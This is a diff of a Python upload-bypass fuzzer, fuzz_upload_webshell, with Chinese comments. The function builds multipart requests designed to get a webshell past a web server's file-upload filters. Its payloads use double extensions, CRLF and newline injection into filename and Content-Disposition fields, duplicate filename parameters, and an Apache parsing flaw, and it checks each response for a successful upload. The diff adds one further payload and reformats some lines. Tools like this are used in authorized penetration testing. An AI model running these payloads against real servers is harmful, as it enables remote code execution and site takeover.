@@ -239,11 +239,13 @@ def fuzz_upload_webshell():
             'modify': {'filename': 'test.%s;%s.%s' % (script_suffix, '王' * 500, work_suffix)}},
         {'desc': '上传test.%s' % script_suffix[:-1] + '\r\n' + script_suffix[-1],
             'modify': {'filename': 'test.%s' % script_suffix[:-1] + '\x0d\x0a' + script_suffix[-1]}},
+        {'desc': '上传%s.%s' % (script_suffix, script_suffix),
+            'modify': {'filename': '%s.%s' % (script_suffix, script_suffix)}},
         {'desc': '两个filename参数且前正常文件后webshell', 'modify': {
             'filename': 'test.%s"; filename="test.%s' % (work_suffix, script_suffix)}},
         {'desc': '两个filename参数且前webshell后正常文件', 'modify': {
             'filename': 'test.%s"; filename="test.%s' % (script_suffix, work_suffix)}},
-        {'desc': '上传test.%s.ddd,通过apache解析漏洞来执行webshell,上传成功后需要访问test.%s.ddd' % (script_suffix,script_suffix), 'modify': {
+        {'desc': '上传test.%s.ddd,通过apache解析漏洞来执行webshell,上传成功后需要访问test.%s.ddd' % (script_suffix, script_suffix), 'modify': {
             'filename': 'test.%s.ddd' % script_suffix}},
         # 双文件上传时,只修改file_name值的情况下可控的位置为两个文件的后缀与第一个文件的content-type,共4种情况
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改',
@@ -410,6 +412,8 @@ def fuzz_upload_webshell():
             'content_type': work_content_type + chr(i)}}
         fuzz_content_type.append(item)
 
+    #
+
     # 修改filename
     for filename_item in fuzz_file_name:
         # filename变,其他不变
@@ -491,6 +495,8 @@ def fuzz_upload_webshell():
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(rsp, origin_html)
 
+    # 修改Content-Disposition中的name部分形如name=\n"file";filename="a.php"
+
     # 修改filename为file\nname,并修改后缀为webshell后缀
     filename_item = {'desc': '修改filename为file\nname', 'modify': {
         'filename': 'file\nname="test.%s"' % script_suffix}}
@@ -511,12 +517,14 @@ def fuzz_upload_webshell():
 
     # boundary和content-disposition中间插入换行
     print("boundary和content-disposition中间插入换行,并修改后缀为webshell后缀")
-    origin_string="--"+boundary+'\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-    new_string="--"+boundary+'\r\n\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"' % (form_file_param_name,script_suffix)
-    packet=work_packet.replace(origin_string,new_string)
+    origin_string = "--" + boundary + \
+        '\r\nContent-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+    new_string = "--" + boundary + \
+        '\r\n\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
+    packet = work_packet.replace(origin_string, new_string)
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(rsp, origin_html)
-
 
     # 修改filename且修改content-type
     for filename_item in fuzz_file_name:
